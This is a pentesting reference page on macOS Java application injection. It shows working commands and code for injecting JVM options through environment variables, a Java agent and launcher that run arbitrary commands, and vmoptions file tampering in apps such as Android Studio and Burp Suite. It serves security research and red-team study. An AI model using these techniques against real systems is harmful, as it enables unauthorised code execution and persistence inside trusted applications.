# macOS Java Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Enumeration

Find Java applications installed in your system. It was noticed that Java apps in the **Info.plist** will contain some java parameters which contain the string **`java.`**, so you can search for that:

```bash
# Search only in /Applications folder
sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null

# Full search
sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
```

## \_JAVA_OPTIONS

The environment variable **`_JAVA_OPTIONS`** can be used to inject arbitrary Java VM parameters when a Java application starts.<sup>[[1]](#references)</sup>

The Java launch stack also recognizes two better-defined variables with different scopes:

- `JAVA_TOOL_OPTIONS` is read when the VM is created, including some embedded launch paths that do not pass through the `java` launcher. It can inject instrumentation options such as `-javaagent`, `-agentlib`, or `-agentpath`.<sup>[[4]](#references)</sup>
- `JDK_JAVA_OPTIONS` is prepended by the `java` launcher to its command line. Options that select the main class or terminate the launcher are prohibited, but `-javaagent` is accepted.<sup>[[5]](#references)</sup>

All three variables should be treated as JVM code-execution controls when an attacker can also provide a compatible readable agent. `_JAVA_OPTIONS` is a HotSpot implementation detail, so validate it against the exact vendor and version; `JAVA_TOOL_OPTIONS` or `JDK_JAVA_OPTIONS` are preferable for portable testing.

```bash
# Write your payload in a script called /tmp/payload.sh
export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
```

To execute it as a new process and not as a child of the current terminal you can use:

```objectivec
#import <Foundation/Foundation.h>
// clang -fobjc-arc -framework Foundation invoker.m -o invoker

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        // Specify the file path and content
        NSString *filePath = @"/tmp/payload.sh";
        NSString *content = @"#!/bin/bash\n/Applications/iTerm.app/Contents/MacOS/iTerm2";

        NSError *error = nil;

        // Write content to the file
        BOOL success = [content writeToFile:filePath
                                 atomically:YES
                                   encoding:NSUTF8StringEncoding
                                      error:&error];

        if (!success) {
            NSLog(@"Error writing file at %@\n%@", filePath, [error localizedDescription]);
            return 1;
        }

        NSLog(@"File written successfully to %@", filePath);

        // Create a new task
        NSTask *task = [[NSTask alloc] init];

        /// Set the task's launch path to use the 'open' command
        [task setLaunchPath:@"/usr/bin/open"];

        // Arguments for the 'open' command, specifying the path to Android Studio
        [task setArguments:@[@"/Applications/Android Studio.app"]];

        // Define custom environment variables
        NSDictionary *customEnvironment = @{
            @"_JAVA_OPTIONS": @"-Xms2m -Xmx5m -XX:OnOutOfMemoryError=/tmp/payload.sh"
        };

        // Get the current environment and merge it with custom variables
        NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary:[[NSProcessInfo processInfo] environment]];
        [environment addEntriesFromDictionary:customEnvironment];

        // Set the task's environment
        [task setEnvironment:environment];

        // Launch the task
        [task launch];
    }
    return 0;
}
```

However, that technique triggers an error in the executed application. A stealthier alternative is to create a Java agent and use `-javaagent`:<sup>[[2]](#references)</sup>

```bash
export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"

# The same agent with the standardized VM initialization variable:
JAVA_TOOL_OPTIONS='-javaagent:/tmp/Agent.jar' java -jar /path/to/application.jar

# Or through the JDK java launcher:
JDK_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar' java -jar /path/to/application.jar
```

> [!CAUTION]
> Creating the agent with a **different Java version** from the application can crash both the agent and the application.

Where the agent can be:

```java:Agent.java
import java.io.*;
import java.lang.instrument.*;

public class Agent {
  public static void premain(String args, Instrumentation inst) {
    try {
      String[] commands = new String[] { "/usr/bin/open", "-a", "Calculator" };
      Runtime.getRuntime().exec(commands);
    }
    catch (Exception err) {
      err.printStackTrace();
    }
  }
}
```

To compile the agent run:

```bash
javac Agent.java # Create Agent.class
jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
```

With `manifest.txt`:

```
Premain-Class: Agent
Agent-Class: Agent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```

And then export the env variable and run the java application like:

```bash
export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```

## vmoptions file

This file supports the specification of **Java parameters** when Java is executed. You can use some of the previous techniques to change the Java parameters and **make the process execute arbitrary commands**.\
Moreover, this file can also **include other files** with the `include` directive, so you can also change an included file.

Even more, some Java apps will **load more than one `vmoptions`** file.

Some applications, such as Android Studio, indicate in their **output where they look** for these files:<sup>[[3]](#references)</sup>

```bash
/Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions

2023-12-13 19:53:23.920 studio[74913:581359] fullFileName is: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] fullFileName exists: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.921 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app.vmoptions
2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
```

If they do not, you can check for it with:

```bash
# Monitor
sudo eslogger lookup | grep vmoption # Give FDA to the Terminal

# Launch the Java app
/Applications/Android\ Studio.app/Contents/MacOS/studio
```

Notice that Android Studio in this example tries to load **`/Applications/Android Studio.app.vmoptions`**, a location where any user in the **`admin` group has write access**.

## References

- [1] [OpenJDK — `_JAVA_OPTIONS` parsing in `arguments.cpp`](https://cr.openjdk.org/~never/bsd_headers/src/share/vm/runtime/arguments.cpp.html)
- [2] [Oracle Java — `java.lang.instrument` package specification](https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html)
- [3] [JetBrains — Configuring JVM options and platform properties](https://intellij-support.jetbrains.com/hc/en-us/articles/206544869-Configuring-JVM-options-and-platform-properties)
- [4] [Oracle Java — `JAVA_TOOL_OPTIONS`](https://docs.oracle.com/javase/8/docs/technotes/guides/troubleshoot/envvars002.html)
- [5] [The `java` launcher — `JDK_JAVA_OPTIONS`](https://docs.oracle.com/en/java/javase/25/docs/specs/man/java.html#using-the-jdk_java_options-launcher-environment-variable)

{{#include ../../../banners/hacktricks-training.md}}
